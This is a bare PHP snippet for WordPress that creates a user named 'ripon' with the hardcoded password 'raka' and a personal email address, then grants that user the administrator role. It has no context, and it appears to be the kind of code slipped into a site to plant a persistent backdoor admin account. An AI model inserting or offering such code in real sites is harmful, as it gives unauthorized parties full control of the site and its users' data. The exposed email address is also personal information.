$user=wp_create_user('ripon','raka','riponhossainchopol@gmail.com');
$new=new WP_user($user);
$new->set_role('administrator');
